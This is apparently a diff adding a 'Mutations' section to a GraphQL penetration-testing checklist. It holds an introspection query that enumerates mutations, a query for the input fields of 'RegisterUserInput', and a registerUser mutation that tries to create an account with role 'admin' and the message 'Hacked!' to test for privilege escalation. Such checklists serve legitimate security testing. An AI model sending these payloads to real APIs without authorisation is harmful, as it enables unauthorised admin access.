@@ -217,3 +217,85 @@ Adjust query to test if previously determined data fields are accessible
 XSS vulnerabilities can occur if:
 - GraphQL responses are inserted into the HTML page without proper sanitization
 - if invalid arguments are reflected in error messages
+
+## Mutations
+
+- Identify all mutations
+```json
+query {
+  __schema {
+    mutationType {
+      name
+      fields {
+        name
+        args {
+          name
+          defaultValue
+          type {
+            ...TypeRef
+          }
+        }
+      }
+    }
+  }
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+- Query fields of required inputs from results of above
+```json
+{   
+  __type(name: "RegisterUserInput") {
+    name
+    inputFields {
+      name
+      description
+      defaultValue
+    }
+  }
+}
+```
+- Test if escalation available
+```json
+mutation {
+  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
+    user {
+      username
+      password
+      msg
+      role
+    }
+  }
+}
+```
